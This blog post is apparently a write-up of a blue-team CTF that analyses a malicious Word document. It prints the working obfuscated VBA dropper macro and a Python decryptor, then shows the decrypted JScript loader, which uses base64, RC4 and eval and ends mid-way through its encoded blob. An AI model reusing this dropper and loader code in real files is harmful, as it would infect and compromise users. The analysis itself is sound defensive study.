---
layout:	post
title:  "Obfuscated"
date:   2025-11-08 02:11:01 +0200
image: /images/2025-11-08-Obfuscated/obfuscated.png
categories: [CyberDefenders, Malware Analysis]
tags: [cyberdefenders]
---

---

**Challenge Link:** [Obfuscated](https://cyberdefenders.org/blueteam-ctf-challenges/obfuscated/)

<br>

## Scenario:

While working as a SOC analyst, you may encounter alerts from the enterprise Endpoint Detection and Response (EDR) system regarding unusual activity on an end-user machine. In one instance, a user reported receiving an email containing a DOC file from an unknown sender. The user subsequently submitted the document for analysis to ensure it does not pose a security risk.

<br>

## Analysis:

To begin the analysis, the challenge file `49b367ac261a722a7c2bbbc328c32545` was examined with `file` command, where it was found to be a Microsoft Word document.

```bash
$ file 49b367ac261a722a7c2bbbc328c32545 

49b367ac261a722a7c2bbbc328c32545: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1, Code page: 1252, Author: user, Template: Normal.dotm, Last Saved By: John, Revision Number: 11, Name of Creating Application: Microsoft Office Word, Total Editing Time: 08:00, Create Time/Date: Fri Nov 25 19:04:00 2016, Last Saved Time/Date: Fri Nov 25 20:04:00 2016, Number of Pages: 1, Number of Words: 320, Number of Characters: 1828, Security: 0
```

Often word document are used as initial stagers that deploys the next stagers. Malicious word document can contain macros, external relationship (remote template) or exploit to some vulnerability. To check for these indicators, the challenge file was scanned using `oleid`.

```bash
$ oleid 49b367ac261a722a7c2bbbc328c32545 

oleid 0.60.1 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: 49b367ac261a722a7c2bbbc328c32545
--------------------+--------------------+----------+--------------------------
Indicator           |Value               |Risk      |Description               
--------------------+--------------------+----------+--------------------------
File format         |MS Word 97-2003     |info      |                          
                    |Document or Template|          |                          
--------------------+--------------------+----------+--------------------------
Container format    |OLE                 |info      |Container type            
--------------------+--------------------+----------+--------------------------
Application name    |Microsoft Office    |info      |Application name declared 
                    |Word                |          |in properties             
--------------------+--------------------+----------+--------------------------
Properties code page|1252: ANSI Latin 1; |info      |Code page used for        
                    |Western European    |          |properties                
                    |(Windows)           |          |                          
--------------------+--------------------+----------+--------------------------
Author              |user                |info      |Author declared in        
                    |                    |          |properties                
--------------------+--------------------+----------+--------------------------
Encrypted           |False               |none      |The file is not encrypted 
--------------------+--------------------+----------+--------------------------
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA    
                    |                    |          |macros. Suspicious        
                    |                    |          |keywords were found. Use  
                    |                    |          |olevba and mraptor for    
                    |                    |          |more info.                
--------------------+--------------------+----------+--------------------------
XLM Macros          |No                  |none      |This file does not contain
                    |                    |          |Excel 4/XLM macros.       
--------------------+--------------------+----------+--------------------------
External            |0                   |none      |External relationships    
Relationships       |                    |          |such as remote templates, 
                    |                    |          |remote OLE objects, etc   
--------------------+--------------------+----------+--------------------------
ObjectPool          |True                |low       |Contains an ObjectPool    
                    |                    |          |stream, very likely to    
                    |                    |          |contain embedded OLE      
                    |                    |          |objects or files. Use     
                    |                    |          |oleobj to check it.       
--------------------+--------------------+----------+--------------------------
```

In the output, it can be seen that this word document contains VBA macros.

Next the VBA macros within this word document were checked using `oledump`.

```bash
$ oledump.py 49b367ac261a722a7c2bbbc328c32545 

  1:       114 '\x01CompObj'
  2:       284 '\x05DocumentSummaryInformation'
  3:       392 '\x05SummaryInformation'
  4:      8017 '1Table'
  5:      4096 'Data'
  6:       483 'Macros/PROJECT'
  7:        65 'Macros/PROJECTwm'
  8: M    7117 'Macros/VBA/Module1'
  9: m    1104 'Macros/VBA/ThisDocument'
 10:      3467 'Macros/VBA/_VBA_PROJECT'
 11:      2964 'Macros/VBA/__SRP_0'
 12:       195 'Macros/VBA/__SRP_1'
 13:      2717 'Macros/VBA/__SRP_2'
 14:       290 'Macros/VBA/__SRP_3'
 15:       565 'Macros/VBA/dir'
 16:        76 'ObjectPool/_1541577328/\x01CompObj'
 17: O   20301 'ObjectPool/_1541577328/\x01Ole10Native'
 18:      5000 'ObjectPool/_1541577328/\x03EPRINT'
 19:         6 'ObjectPool/_1541577328/\x03ObjInfo'
 20:    133755 'WordDocument'
```

The output revealed 3 streams that contains macros :
- Stream 8 (`Macros/VBA/Module1`) marked with `M`, indicating macro with code. 
- Stream 9 (`Macros/VBA/ThisDocument`) marked with `m`, indicating macro with user form. 
- Stream 17 (`ObjectPool/_1541577328/\x01Ole10Native`) marked with `O`, indicating embedded OLE object.

Lets use `oledump` again to dump the macro code. 

```bash
oledump.py -s 8 -v 49b367ac261a722a7c2bbbc328c32545 
```

The dumped VBA macro is beautified and shown below:

``` vb
Public OBKHLrC3vEDjVL As String
Public B8qen2T433Ds1bW As String

Function Q7JOhn5pIl648L6V43V(EjqtNRKMRiVtiQbSblq67() As Byte, M5wI32R3VF2g5B21EK4d As Long) As Boolean
    Dim THQNfU76nlSbtJ5nX8LY6 As Byte
    THQNfU76nlSbtJ5nX8LY6 = 45

    For i = 0 To M5wI32R3VF2g5B21EK4d - 1
        EjqtNRKMRiVtiQbSblq67(i) = EjqtNRKMRiVtiQbSblq67(i) Xor THQNfU76nlSbtJ5nX8LY6
        THQNfU76nlSbtJ5nX8LY6 = ((THQNfU76nlSbtJ5nX8LY6 Xor 99) Xor (i Mod 254))
    Next i

    Q7JOhn5pIl648L6V43V = True
End Function

Sub AutoClose()
    On Error Resume Next
    Kill OBKHLrC3vEDjVL

    On Error Resume Next
    Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
    R7Ks7ug4hRR2weOy7.DeleteFile B8qen2T433Ds1bW & "\*.*", True
    Set R7Ks7ug4hRR2weOy7 = Nothing
End Sub

Sub AutoOpen()
    On Error GoTo MnOWqnnpKXfRO

    Dim NEnrKxf8l511
    Dim N18Eoi6OG6T2rNoVl41W As Long
    Dim M5wI32R3VF2g5B21EK4d As Long

    N18Eoi6OG6T2rNoVl41W = FileLen(ActiveDocument.FullName)
    NEnrKxf8l511 = FreeFile
    Open (ActiveDocument.FullName) For Binary As #NEnrKxf8l511

    Dim E2kvpmR17SI() As Byte
    ReDim E2kvpmR17SI(N18Eoi6OG6T2rNoVl41W)
    Get #NEnrKxf8l511, 1, E2kvpmR17SI

    Dim KqG31PcgwTc2oL47hjd7Oi As String
    KqG31PcgwTc2oL47hjd7Oi = StrConv(E2kvpmR17SI, vbUnicode)

    Dim N34rtRBIU3yJO2cmMVu, I4j833DS5SFd34L3gwYQD
    Dim VUy5oj112fLw51h6S
    Set VUy5oj112fLw51h6S = CreateObject("vbscript.regexp")
    VUy5oj112fLw51h6S.Pattern = "MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh"

    Set I4j833DS5SFd34L3gwYQD = VUy5oj112fLw51h6S.Execute(KqG31PcgwTc2oL47hjd7Oi)

    Dim Y5t4Ul7o385qK4YDhr
    If I4j833DS5SFd34L3gwYQD.Count = 0 Then GoTo MnOWqnnpKXfRO

    For Each N34rtRBIU3yJO2cmMVu In I4j833DS5SFd34L3gwYQD
        Y5t4Ul7o385qK4YDhr = N34rtRBIU3yJO2cmMVu.FirstIndex
        Exit For
    Next

    Dim Wk4o3X7x1134j() As Byte
    Dim KDXl18qY4rcT As Long
    KDXl18qY4rcT = 16827
    ReDim Wk4o3X7x1134j(KDXl18qY4rcT)

    Get #NEnrKxf8l511, Y5t4Ul7o385qK4YDhr + 81, Wk4o3X7x1134j

    If Not Q7JOhn5pIl648L6V43V(Wk4o3X7x1134j(), KDXl18qY4rcT + 1) Then GoTo MnOWqnnpKXfRO

    B8qen2T433Ds1bW = Environ("appdata") & "\Microsoft\Windows"
    Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")

    If Not R7Ks7ug4hRR2weOy7.FolderExists(B8qen2T433Ds1bW) Then
        B8qen2T433Ds1bW = Environ("appdata")
    End If
    Set R7Ks7ug4hRR2weOy7 = Nothing

    Dim K764B5Ph46Vh
    K764B5Ph46Vh = FreeFile
    OBKHLrC3vEDjVL = B8qen2T433Ds1bW & "\" & "maintools.js"

    Open (OBKHLrC3vEDjVL) For Binary As #K764B5Ph46Vh
    Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j
    Close #K764B5Ph46Vh

    Erase Wk4o3X7x1134j

    Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
    R66BpJMgxXBo2h.Run """" & OBKHLrC3vEDjVL & """" & " EzZETcSXyKAdF_e5I2i1"

    ActiveDocument.Save
    Exit Sub

MnOWqnnpKXfRO:
    Close #K764B5Ph46Vh
    ActiveDocument.Save
End Sub
```

Lets now understand the above VBA macro:
- The macro auto executes when this document is opened via `AutoOpen()` function.

- It reads its own document contents in binary mode, at line 35. Then, it converts the binary data into a Unicode string and store under `KqG31PcgwTc2oL47hjd7Oi` at line 42.
- From line 46-49, it searches the document for a hardcoded marker string, `MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh` using regular expression. Once found, it retrieve the first index of this marker at line 55.
- At line 64, it moves the index 81 bytes forwards from the marker's position, skipping over the marker and store it under `Wk4o3X7x1134j`. 

This suggests that it uses the marker to identify and extract the next stager payload hidden within the document.

- At line 66, it calls `Q7JOhn5pIl648L6V43V()` function with two arguments: extracted payload `Wk4o3X7x1134j()` and payload size (`KDXl18qY4rcT + 1`) arguments. At line 61, the `KDXl18qY4rcT` is assigned `16827`. So the total payload size is `16828`.
- The `Q7JOhn5pIl648L6V43V()` function performs XOR operation, where initial XOR key `THQNfU76nlSbtJ5nX8LY6` is 45. Each byte of extracted payload is XORed with current key. And, the key is updated for each byte as: 

	`THQNfU76nlSbtJ5nX8LY6 = ((THQNfU76nlSbtJ5nX8LY6 Xor 99) Xor (i Mod 254))`

This decrypts the extracted payload via XOR operation.

- From line 68-78, it creates a new file `%AppData%\Roaming\Microsoft\Windows\maintools.js`. At line 80-82, it writes the decrypted payload to this file.
- At line 86-87, it executes the `maintool.js` with `EzZETcSXyKAdF_e5I2i1` parameter using `WScript.Shell`.

- The macro deletes the dropped file `maintools.js` when exiting the document via `AutoClose()` function.

I wrote a config extract in Python to locate the marker, extract the payload and perform XOR operation to decrypt it.

```python
import argparse

def xor_decrypt(data):
    key = 45
    for i in range(len(data)):
        data[i] = data[i] ^ key
        key = ((key ^ 99) ^ (i % 254)) & 0xFF
    return data


def extract_payload(file, pattern, payload_size):
    try:
        with open(file, "rb") as f:
            content = f.read()
    except FileNotFoundError:
        print(f"[-] ERROR: {file} not found")

    index = content.find(pattern)
    if index == -1:
        print("[-] ERROR: Marker not found!")
        return

    payload = content[index + len(pattern): index + len(pattern) + payload_size]
    return payload

def main():
    PATTERN = b"MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh"
    PAYLOAD_SIZE = 16828

    parser = argparse.ArgumentParser(description = "Extract Payload")
    parser.add_argument("--file", "-f", required = True, help = "File to extract from")
    parser.add_argument("--out", "-o", default= "decrypted.js")
    args = parser.parse_args()

    encrypted_payload = extract_payload(args.file, PATTERN, PAYLOAD_SIZE)
    decrypted_payload = xor_decrypt(bytearray(encrypted_payload))

    with open(args.out, "wb") as f:
        f.write(decrypted_payload)

    print(f"[-] SUCCESS: Decrypted payload saved to {args.out}")

if __name__ == "__main__":
    main()
```

The resulting JS payload produced from above config extractor is shown below:

```js
try {
    var wvy1 = WScript.Arguments;
    var ssWZ = wvy1(0);
    var ES3c = y3zb();
    ES3c = LXv5(ES3c);
    ES3c = CpPT(ssWZ, ES3c);
    eval(ES3c);
} catch (e) {
    WScript.Quit();
}

function MTvK(CgqD) {
    var XwH7 = CgqD.charCodeAt(0);
    if (XwH7 === 0x2B || XwH7 === 0x2D) return 62
    if (XwH7 === 0x2F || XwH7 === 0x5F) return 63
    if (XwH7 < 0x30) return -1
    if (XwH7 < 0x30 + 10) return XwH7 - 0x30 + 26 + 26
    if (XwH7 < 0x41 + 26) return XwH7 - 0x41
    if (XwH7 < 0x61 + 26) return XwH7 - 0x61 + 26
}

function LXv5(d27x) {
    var LUK7 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    var i;
    var j;
    var n6T8;
    if (d27x.length % 4 > 0)
        return;
    var CHlB = d27x.length;
    var V8eR = d27x.charAt(CHlB - 2) === '=' ? 2 : d27x.charAt(CHlB - 1) === '=' ? 1 : 0
    var mjqo = new Array(d27x.length * 3 / 4 - V8eR);
    var z8Ht = V8eR > 0 ? d27x.length - 4 : d27x.length;
    var t2JG = 0;

    function XGH6(b0tQ) {
        mjqo[t2JG++] = b0tQ;
    }
    for (i = 0, j = 0; i < z8Ht; i += 4, j += 3) {
        n6T8 = (MTvK(d27x.charAt(i)) << 18) | (MTvK(d27x.charAt(i + 1)) << 12) | (MTvK(d27x.charAt(i + 2)) << 6) | MTvK(d27x.charAt(i + 3));
        XGH6((n6T8 & 0xFF0000) >> 16)
        XGH6((n6T8 & 0xFF00) >> 8)
        XGH6(n6T8 & 0xFF)
    }
    if (V8eR === 2) {
        n6T8 = (MTvK(d27x.charAt(i)) << 2) | (MTvK(d27x.charAt(i + 1)) >> 4)
        XGH6(n6T8 & 0xFF)
    } else if (V8eR === 1) {
        n6T8 = (MTvK(d27x.charAt(i)) << 10) | (MTvK(d27x.charAt(i + 1)) << 4) | (MTvK(d27x.charAt(i + 2)) >> 2)
        XGH6((n6T8 >> 8) & 0xFF)
        XGH6(n6T8 & 0xFF)
    }
    return mjqo
}

function CpPT(bOe3, F5vZ) {
    var AWy7 = [];
    var V2Vl = 0;
    var qyCq;
    var mjqo = '';
    for (var i = 0; i < 256; i++) {
        AWy7[i] = i;
    }
    for (var i = 0; i < 256; i++) {
        V2Vl = (V2Vl + AWy7[i] + bOe3.charCodeAt(i % bOe3.length)) % 256;
        qyCq = AWy7[i];
        AWy7[i] = AWy7[V2Vl];
        AWy7[V2Vl] = qyCq;
    }
    var i = 0;
    var V2Vl = 0;
    for (var y = 0; y < F5vZ.length; y++) {
        i = (i + 1) % 256;
        V2Vl = (V2Vl + AWy7[i]) % 256;
        qyCq = AWy7[i];
        AWy7[i] = AWy7[V2Vl];
        AWy7[V2Vl] = qyCq;
        mjqo += String.fromCharCode(F5vZ[y] ^ AWy7[(AWy7[i] + AWy7[V2Vl]) % 256]);
    }
    return mjqo;
}

function y3zb() {
    var qGxZ = "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